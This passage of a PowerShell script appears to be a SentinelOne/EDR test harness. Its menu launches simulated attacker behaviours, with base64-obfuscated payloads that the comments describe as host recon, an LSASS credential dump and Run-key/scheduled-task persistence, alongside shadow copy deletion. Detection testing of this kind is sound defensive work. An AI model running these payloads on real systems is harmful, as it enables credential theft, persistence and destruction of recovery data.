J3ZlJ3bG1CIi42bpRXYyVWb15WZgAXdvJ3ZtQWZnVGbpZXayBHIvACRBBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 6) Local host discovery / recon (T1082 / T1033 / T1016 / T1057).
$LocalReconBody = '1IDI0NncpZULgQ3YlpmYP1CdjVGblNFI8BCdzlGbrNXY0pgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIpMXZzNXZj9mcwBCcvRHKgQ3cpx2azFGdg0SLt4GYiACdz9GStUGdpJ3VKoQYtACcyFmCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLgEWLgAnchBSLt0ibgJCI0N3bI1SZ0lmcXpgC1IDI0NncpZULgQ3YlpmYP1CdjVGblNFI8BiIH5USOVEVTlETiAyZulmc0NVL0NWZsV2UgwHIv5WYtACdhR3c0VmbK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtASKn5WauVGdzlGboAybuFWLgQXY0NHdl5GIt0SLuBmIgQ3cvhULlRXaydlCKwGbh9CInlmZu92YwlmCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLgwGbh9CInlmZu92YwlGIt0SLuBmIgQ3cvhULlRXaydlCKAjMgQ3cylmRtACdjVmai9UL0NWZsV2UgwHIvZmbp1WZ0NXezpgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIpknch1Wb1NHKg8mZulWblR3c5NHIt0SLuBmIgQ3cvhULlRXaydlCKAXdvJ3ZsF2YvxGI0VmbKIXZzVHI0VmbK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtACc19mcnxWYj9GbgQXZuByLgIXZzVHI0Vmbg0SLt4GYiACdz9GStUGdpJ3VKoAbsF2LgkWbh9Ga3pgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIsxWYvASatF2bodHIt0SLuBmIgQ3cvhULlRXaydlCK4WY5NEIy9GbvNEZuV3bydWZy9mRtAiIu92YlJHIvASeyVmdvN2cpRGI0N3boBCbhN2bMBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 7) LSASS credential-dump test via a signed-DLL memory dump (T1003.001).
#    Standard Atomic Red Team detection test. Writes a dump locally; no exfil.
$LsassDumpBody = '9pAZlJFIy9GbvNEZuV3bydWZy9mRtAiIuM3clN2byBHIzNXYzxGIk5WamBCdv5GIkxWdvNEIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BSZzxWZg0nC9BCIgAiC39GbsVWWgI3bs92Qk5WdvJ3ZlJ3bG1CIi4SKkVGdjVGc4VGIzFGIsQmchV3RgwWYpRnblRWZyNEIvAiUEVEI5JGIkV2aj9GbihCIkV2Y1R2byBHIw1WdkBybOBSXkxWaoN2WiACdz9GStUGdpJ3VgACIgACIgAiC7BSZzxWZg0HIgACIK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIpgGdn5WZM5SKw1WdkRCItVGdJ1CdldEKgYWLgIiLzVGd5JGI9BzegojblRHdpJ3dgAXb1REIdRGbph2YbJCKgQ3cvhULlRXaydFIgACIgACIgowegkCctVHZkACa0FGUtQ3clRFKgYWagACIgoAbsVnZgAXb1RGJgQWaQN3chNHbkACctVHRp5WaNBCLsxGZuM3Y2NXbvNGXyMTblR3c5NFXzd3bk5WaXxlODBSZ4VmLyMDbsRmb1JHIgACIKc3bsxWZZBicvx2bDRmb19mcnVmcvZULgICctVHZkACI+0CIgQWaQN3chNHbkAiOElEUgM3chNHbg0FZslGajtlIgQ3cvhULlRXaydFIgACIKQWSuM3chNHbkASPgQWaQN3chNHbkACIgAiC7BSKzNXYzxGJoAiZppQZ15Wa052bDlHb05WZsl2Ug42bpR3YBJ3byJXRtAyczF2csByczV2YvJHUtQXZHBSPgM3chNHbkoQKpIycz1WbIh0XkRWTNlXe5lnIgQXYtJ3bG1CIlRXYE1CdldEKgYWLgICctRmL9BzefN3chNHbcR3clRlUEVkIoACUNVEV6YnblRCIoRXYQ1ibp9mSg0DIw1WdkRiCK4WY5NEIy9GbvNEZuV3bydWZy9mRtAiIpEDMw4yMwATMUhCI0NXZ0BCctVHZgkncv1WZtByUTF0UMBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 8) Persistence: HKCU Run key + scheduled task (T1547.001 / T1053.005).
#    Both are benign no-op payloads and are removed by the cleanup line shown.
$PersistBody = '=kXYyd0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIiY0Lgs2chRFdzVGVSRURg4EVvASZ0VGblR0LgM3azFGdoN2cgAiIgQ3cvhULlRXaydlC5FmcHtmchREIy9GbvNEZuV3bydWZy9mRtAiInUWbh5EbhZHJnASZtFmTtAyJ5V2SuVnckcCI5RnclB3byBVblRXStUmdv1WZSBCIiACdz9GStUGdpJ3VKkXYyd0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIiojb1JHIsQmchdnclRnZhBSZj5WZ0NXazJXZwBSZ29WblJHIvRFIdRGbph2Yb5GYiACdz9GStUGdpJ3VKowdvxGbllFIy9GbvNEZuV3bydWZy9mRtAiIFR0TDRVSYVEVTFETkAiOlR2bjBCdphXZgM3azFGdoN2cg0FZslGajtlIgQ3cvhULlRXaydlCG9CIO90RPxkTPByQT9CIiQ3clRlUEVEI0VHc0V3TtUGdpJ3VgQmbh1WbvNULgUGbpZ2byB1bO1CIlhXZuwGblh2cyV2dvBnIgIFVvAiIrNXYUR3clRlUEVkIg4EVvASZ0FWZyN0LgUGel5ycrNXY0h2Yzpgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIp40TH9ETO9EKgUGdhVmcjBycrNXY0h2YzBSLt0ibgJCI0N3bI1SZ0lmcXpgC39GbsVWWgI3bs92Qk5WdvJ3ZlJ3bG1CIi4yJl1WYOxWY2RyJgUWdsFmdg4WdSBSVDtESgQWZkRWQg0FZslGajtlIgQ3cvhULlRXaydlCkF2bslXYwRCIlVHbhZVLgUWbh5EbhZHJgUWbh5ULgkXZL5WdyRCIoRXYQ1CI5RnclB3byBVblRXStQXZTpgCnICdzVGVSRURgQXdwRXdP1SZ0lmcXJCIk5WYt12bD1CIuVGZklGSgUGb5R3U39GZul2VtASZslmZvJHUv5ULgUGel5CbsVGazJXZ39GcnASPgQWYvxWehBHJKICdzl2cyVGU0NXZUJFRFJCI9ASZtFmTsFmdkogIuVnUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVmchdHdm92UcpTVDtESiASPgASeltkb1JHJKogbhl3QgI3bs92Qk5WdvJ3ZlJ3bG1CIis2chRHIkVGb1RWZoN2cgsCI5V2ag4WdSBiO0NXZ0BSZj5WZ0NXazJXZQBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# ----------------------------------------------------------------------------
# Menu loop (this is the PARENT process that must survive)
# ----------------------------------------------------------------------------
function Show-Banner {
    $art = @'
        ,--./,-.
       /  ,-.   \      ___________________________
      |  ( X )  |     /                           \
       \  `-'  /     |   E D R   L A B   R A T      |
        `--|--'      |   SentinelOne test harness   |
     _.-'"|  |"'-._   \___________________________/
   .'     |  |     '.
  /   .-. |  | .-.   \      * * * * * * * * *
 |   ( o )|  |( o )   |    *   VIRUS  SIM    *
 |    `-' |__| `-'    |     * * * * * * * * *
  \      /|  |\      /
   '.__.' |  | '.__.'
      |   |  |   |
      |   `--'   |
       \  ,--.  /
        `-|  |-'
          |  |
        __|  |__
       [________]
'@
    Write-Host $art -ForegroundColor Green
    Write-Host ""
    Write-Host " ============================================================" -ForegroundColor Yellow
    Write-Host "  EDR / SentinelOne Alert-Correlation Test Harness  v$ScriptVersion" -ForegroundColor Yellow
    Write-Host "  SANDBOX / NON-PRODUCTION USE ONLY" -ForegroundColor Red
    Write-Host " ============================================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  What this does:" -ForegroundColor White
    Write-Host "    Fires common attacker-style behaviors (EICAR, shadow-copy"
    Write-Host "    tampering, AD recon, credential-dump + persistence tests)"
    Write-Host "    so you can watch SentinelOne detect them and validate your"
    Write-Host "    alert-correlation logic."
    Write-Host ""
    Write-Host "  How it runs:" -ForegroundColor White
    Write-Host "    Every numbered action launches in its OWN child process/"
    Write-Host "    window. If S1 kills or quarantines a child, THIS menu keeps"
    Write-Host "    running so you can fire the next test - no need to restart."
    Write-Host "    The menu loops until you type 'q'. Options 9-11 launch the"
    Write-Host "    bundled test scripts. Every selection and the exact"
    Write-Host "    commands it runs are logged to .\Logs."
    Write-Host ""
    Write-Host "  Word commands (typed instead of a number):" -ForegroundColor White
    Write-Host "    enableshadow   Re-enable shadow copy / VSS (undo option 3)"
    Write-Host "    cleanup        Remove persistence + delete test artifacts"
    Write-Host "    q              Quit the harness"
    Write-Host ""
    Write-Host "  Heads up:" -ForegroundColor White
    Write-Host "    Recommended: run this harness as Administrator."
    Write-Host "    Options 2/3 make real changes - use 'enableshadow' to revert."
    Write-Host " ============================================================" -ForegroundColor Yellow
}

function Show-Menu {
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "  EDR / SentinelOne Test Harness  (SANDBOX ONLY)" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "  1              Download EICAR and write to disk"
    Write-Host "  2              Delete shadow copies            (elevated)"
    Write-Host "  3              Disable shadow copy / VSS        (elevated)"
    Write-Host "  4              List shadow copy / VSS state     (elevated, read-only)"
    Write-Host "  5              AD / privileged-group enum       (T1069/T1087)"
    Write-Host "  6              Local host discovery / recon     (T1082/T1033/T1016)"
    Write-Host "  7              LSASS credential-dump test       (elevated, T1003.001)"
    Write-Host "  8              Persistence: Run key + task      (T1547/T1053)"
    Write-Host "  -- Bundled test scripts ---------------------------" -ForegroundColor DarkCyan
    Write-Host "  9              S1 IDR AD-enumeration tests      (Invoke-S1IDRTests.ps1)"
    Write-Host "  10             Verify IDR configuration         (Verify-IDRConfig.ps1, read-only)"
    Write-Host "  11             ISPM threat tests  MODIFIES AD   (Test-ISPMThreats.ps1, lab only)"
    Write-Host "---------------------------------------------------" -ForegroundColor Cyan
    Write-Host "  enableshadow   Re-enable shadow copy / VSS      (elevated)"
    Write-Host "  cleanup        Remove persistence + artifacts"
    Write-Host "  q              Quit"
    Write-Host "--------------------------------------------------" -ForegroundColor Cyan
    Write-Host "  (Each action runs in its own process; S1 killing"
    Write-Host "   a child will not take down this menu.)" -ForegroundColor DarkGray
    Write-Host ""
}

Show-Banner
Write-Host ""
Write-Host "Artifacts / child scripts directory: $WorkDir" -ForegroundColor DarkGray
Write-Host "Session log: $LogFile" -ForegroundColor DarkGray
Write-RunLog "Harness started (PID $PID)" 'INFO'

do {
    Show-Menu
    $choice = (Read-Host "Select an option").Trim().ToLower()
    Write-RunLog "Menu selection: '$choice'" 'MENU'

    switch ($choice) {
        '1' {
            Start-DetachedAction -Name 'DownloadEicar' -Body $EicarBody
        }
        '2' {
            Start-DetachedAction -Name 'DeleteShadow' -Body $DeleteShadowBody -Elevated
        }
        '3' {
            Start-DetachedAction -Name 'DisableShadow' -Body $DisableShadowBody -Elevated
        }
        '4' {
            Start-DetachedAction -Name 'ListShadow' -Body $ListShadowBody -Elevated
        }
        '5' {
            Start-DetachedAction -Name 'AdEnum' -Body $AdEnumBody
        }
        '6' {
            Start-DetachedAction -Name 'LocalRecon' -Body $LocalReconBody
        }
        '7' {
            Start-DetachedAction -Name 'LsassDump' -Body $LsassDumpBody -Elevated
        }
        '8' {
            Start-DetachedAction -Name 'Persistence' -Body $PersistBody
        }
        '9' {
            Start-DetachedScript -Name 'S1IDRTests' -ScriptPath 'Invoke-S1IDRTests.ps1'
        }
        '10' {
            Start-DetachedScript -Name 'VerifyIDRConfig' -ScriptPath 'Verify-IDRConfig.ps1'
        }
        '11' {
            Start-DetachedScript -Name 'ISPMThreats' -ScriptPath 'Test-ISPMThreats.ps1' -Elevated
        }
        'enableshadow' {
            Start-DetachedAction -Name 'EnableShadow' -Body $EnableShadowBody -Elevated
        }
        'cleanup' {
            Invoke-Cleanup
        }
        'q' {
            Write-Host "Exiting." -ForegroundColor Cyan
        }
        default {
            Write-Host "[!] Unknown option: '$choice'" -ForegroundColor Red
        }
    }

    if ($choice -ne 'q') {
        Write-Host ""
    }
}
while ($choice -ne 'q')
